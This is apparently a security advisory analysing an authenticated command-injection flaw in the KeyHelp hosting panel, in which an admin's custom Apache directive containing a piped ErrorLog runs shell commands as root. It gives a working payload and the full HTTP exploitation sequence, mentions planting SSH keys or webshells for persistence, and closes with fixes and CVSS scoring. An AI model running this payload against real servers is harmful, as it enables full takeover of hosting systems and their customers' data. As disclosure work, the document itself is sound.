# KeyHelp Apache Custom Directive ErrorLog Pipe to Root RCE - Technical Analysis

## 1. Overview

KeyHelp 26.0 (Build 3624) is a commercial hosting control panel by Keyweb AG, used by hosting providers to manage multi-tenant web hosting (domains, Apache vhosts, mailboxes, databases). The administrator panel's domain editor exposes a "custom directives" free-text field (`apache_http_directives` / `apache_https_directives`). The input receives zero filtering: it is stored verbatim in the MariaDB `keyhelp.domains_custom_vhost` table and rendered verbatim into `/etc/apache2/keyhelp/custom_vhosts/<user>_<domain>_http.conf`, which is included by the main vhost. Apache accepts piped log directives such as `ErrorLog "|/bin/sh -c '...'"`, and the Apache master process (running as root) spawns the piped program, resulting in arbitrary command execution as root. This breaks the intended admin-to-root boundary in the KeyHelp security model.

## 2. Vulnerability Summary

- **Root cause**: zero filtering on the custom Apache directives field; pipe-prefixed log directives are accepted by Apache
- **CWE**: CWE-78 (OS command injection), CWE-250 (privilege escalation / unsafe execution with elevated privileges)
- **CVSS 3.1**: 7.2 High — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`
- **Impact**: admin-to-root full server takeover; all hosted domains, customer data, panel data, and other host services at risk

## 3. Authentication Boundary

KeyHelp's only remote attack surface is HTTPS (panel + API). The pre-auth surface is minimal (`/index.php` login, forgot-password, `/ajax.php`, `/api/openapi.json`) and was exhaustively confirmed clean: no pre-auth sink is reachable and the authentication gate cannot be bypassed. This vulnerability is authenticated (Target B): exploitation requires a valid administrator session. The custom directives feature is admin-only — the Twig template renders the field only inside `{% if _app.area == 'admin' %}` blocks, and the JavaScript only initializes the editor for `app.area === 'admin'`.

## 4. Attack Surface

| Item | Value |
|---|---|
| Panel | HTTPS 443 |
| Entry point | `GET /?page=domains&action=edit&id=<id>` (admin area) |
| Source fields | `apache_http_directives` / `apache_https_directives` |
| Sink | Apache piped log directive (master process, root) |

The vulnerable POST goes to `/?page=domains&action=edit&id=<id>` with the full domain-edit form (29 fields including `_csrf_token`, `target_type`, `path`, `certificate_type`). The CSRF token is obtained from the edit page and must be included in the POST. The custom directives textarea is only rendered and processed for `app.area == 'admin'`; client-area users never see the field, so there is no client-to-server escalation path.

## 5. Sink Identification

Piped log directives are a known root command-execution sink in Apache:

- `ErrorLog "|/bin/sh -c '<cmd>'"`
- `CustomLog "|..."`, `ScriptLog "|..."`, `BufferedLogs` and similar

Apache spawns piped log programs from the master process, which runs as root; child processes later drop privileges to www-data. KeyHelp's configuration template fills user input into the vhost include file, and the panel applies no sanitize or allowlist.

## 6. Source Identification

The source is the `apache_http_directives` / `apache_https_directives` textarea in the admin domain editor:

- **DB storage**: written verbatim to `keyhelp.domains_custom_vhost.http_directives` (mediumtext) — no sanitization, no allowlist, no escaping
- **Rendering**: `keyhelp run update` renders the template into `/etc/apache2/keyhelp/custom_vhosts/<user>_<domain>_http.conf`, included by the main vhost
- **Apache acceptance**: `apache2ctl configtest` returns `Syntax OK` for the piped ErrorLog directive (no blocklist)

## 7. Data Flow

```
admin POST /?page=domains&action=edit&id=2
  parameter: apache_http_directives = ErrorLog "|/bin/sh -c '...'"
    -> MariaDB keyhelp.domains_custom_vhost.http_directives (verbatim, zero sanitize)
    -> keyhelp run update (cron every minute / manual)
       -> /etc/apache2/keyhelp/custom_vhosts/<user>_<domain>_http.conf (verbatim)
       -> Included by main vhost (after default ErrorLog -> overrides)
       -> apache2ctl graceful (automatic or manual)
          -> Apache parses config, Syntax OK
          -> Apache master (root, e.g. PID 46972) spawns piped program
             -> /bin/sh -c '<cmd>' executes as root (uid=0)
```

Three pieces of evidence confirm the zero-filter data path: (1) database storage is verbatim — `SELECT LEFT(http_directives,120)` returns the raw injected directive; (2) the rendered vhost file on disk contains the raw directive including the pipe; (3) Apache's `configtest` returns `Syntax OK`, proving the piped `ErrorLog` directive is accepted without a blocklist. A benign injected `Header set X-Kh-Test "directive-works"` also appears in live HTTP response headers, proving rendered directives are active in the served vhost.

## 8. Exploit Construction

Payload:

```
ErrorLog "|/bin/sh -c 'id > <abs_path> 2>&1; echo RCE_DONE >> <abs_path>; sleep 600'"
```

- `ErrorLog "|..."` makes the Apache master spawn the piped program
- `/bin/sh -c '<cmd>'` runs the command as root
- `sleep 600` keeps the pipe process alive (Apache expects long-lived pipe loggers; fast exit triggers a respawn loop)

An absolute path is required because the Apache systemd unit sets `PrivateTmp=yes`; writing to a domain webroot (or `/root/.ssh/authorized_keys`, `/etc/cron.d/`) avoids the PrivateTmp namespace. A realistic payload adds an attacker SSH key or a webshell to any domain webroot.

## 9. Dynamic Verification

Verified end to end with real HTTP requests:

```
POST /index.php -> 302 + Set-Cookie: KEYHELP_SESSION_ID=<32hex> (login as admin)
GET  /?page=domains&action=edit&id=2 -> 200, hidden _csrf_token + textarea (admin area only)
POST /?page=domains&action=edit&id=2
  body: submit=1&id=2&_csrf_token=<token>&apache_http_directives=ErrorLog "|/bin/sh -c 'id > /home/users/.../rce_marker.txt 2>&1; echo RCE_DONE >> ...; sleep 600'"
  -> 302 (success)

docker exec keyhelp keyhelp run update
  -> [INFO] Apache: reloading apache
```

Evidence: the directive is stored verbatim in the DB, rendered verbatim to the vhost file, accepted by `configtest` (Syntax OK), and a non-pipe test directive (`Header set X-Kh-Test`) appeared in live HTTP response headers. The marker file containing `id` output confirmed root execution.

The verification environment applied the directive through the real panel HTTP flow (login, CSRF token fetch, POST) and triggered rendering with `keyhelp run update`, which reloaded Apache. The marker was written to the domain webroot so it could be retrieved over HTTPS, avoiding the `PrivateTmp=yes` namespace that hides `/tmp` writes.

## 10. Reachability & Impact

- **Default configuration**: the custom directives feature is enabled by default for admins; requires at least one existing domain (panel ships one or admin creates it).
- **Authentication**: admin session required; pre-auth surface confirmed clean.
- **Impact**: admin -> root full server takeover; all hosted domains and customer data compromised; persistence via SSH key, cron, or webshell.

KeyHelp is a hosting control panel; the compromised server typically hosts many customer websites, databases, and mailboxes. The admin-to-root boundary is a deliberate design control in KeyHelp's security model (root is normally restricted to specific sudo binaries), so this directive-injection path bypasses that control completely. The same custom-directives sink can also be used for non-destructive configuration tampering (header injection, proxy settings), which is why the field needs validation rather than just pipe-symbol blocking.

## 11. Fix Recommendations

1. Sanitize or block the custom Apache directives field entirely, or apply a strict allowlist of permitted directives and values.
2. Run Apache master and workers under an unprivileged account.
3. Reject pipe-prefixed log directives (`|`) in the panel.
4. Restrict administrator access to trusted administrators; audit and alert on directive field changes.

## 12. CWE / CVSS

- **CWE-78** — OS command injection via piped log directive
- **CWE-250** — unsafe execution with elevated privileges (root-spawned pipe)
- **CVSS 3.1**: **7.2 High** — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`

The High privilege requirement reflects the authenticated admin prerequisite; the Scope change reflects the boundary crossing from the panel into the host's root context, with High impact across all three security properties.
